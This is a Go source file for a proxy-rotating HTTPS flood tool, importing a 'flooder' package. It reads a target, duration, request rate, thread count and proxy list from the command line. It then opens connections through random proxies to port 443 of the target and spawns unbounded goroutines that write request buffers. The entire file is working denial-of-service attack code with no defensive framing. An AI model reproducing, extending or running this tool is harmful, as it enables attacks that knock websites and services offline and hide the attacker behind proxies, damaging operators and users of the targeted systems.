package main

import (
	"flooder/packages"
	"net"
	"os"
	"runtime"
	"sync/atomic"
	"time"
)

func createRequests(socket net.Conn, attackInfo *packages.AttackInfo, errors *int32) {
	for index := 0; index < attackInfo.RequestRate; index++ {
		go func(attackInfo *packages.AttackInfo, socket net.Conn, errors *int32) {
			buffer := packages.GetBuffer(attackInfo)
			if written, err := socket.Write(buffer); err != nil || written != len(buffer) {
				atomic.AddInt32(errors, 1)
			}
		}(attackInfo, socket, errors)
	}
}

func attackSocket(attackInfo *packages.AttackInfo) {
	proxyAddress := packages.RandValue(attackInfo.Proxies)
	host, port, err := net.SplitHostPort(proxyAddress)
	if err != nil {
		return
	}
	options := &packages.ProxyOptions{
		Proxy: &packages.Address{
			Host: host,
			Port: packages.ToInt(port),
		},
		Target: &packages.Address{
			Host: attackInfo.Target.Host,
			Port: 443,
		},
		Timeout: 1 * time.Second,
	}
	socket, err := packages.GetClientConnection(options)
	if err != nil {
		return
	}
	var errors int32
	for errors < 5 {
		time.Sleep(1 * time.Second)
		go createRequests(socket, attackInfo, &errors)
	}
}

func executeAttack(attackInfo *packages.AttackInfo) {
	for {
		time.Sleep(1 * time.Millisecond)
		go attackSocket(attackInfo)
	}
}

func main() {
	cores := runtime.NumCPU()
	runtime.GOMAXPROCS(cores)
	target := os.Args[1]
	duration := os.Args[2]
	requestRate := os.Args[3]
	threads := os.Args[4]
	proxyFile := os.Args[5]
	attackInfo := &packages.AttackInfo{
		Target:      packages.ParseTarget(target),
		Duration:    packages.ToInt(duration),
		RequestRate: packages.ToInt(requestRate),
		Threads:     packages.ToInt(threads),
		Proxies:     packages.ReadLines(proxyFile),
	}
	for count := 1; count <= attackInfo.Threads; count++ {
		go executeAttack(attackInfo)
	}
	time.Sleep(time.Duration(attackInfo.Duration) * time.Second)
}
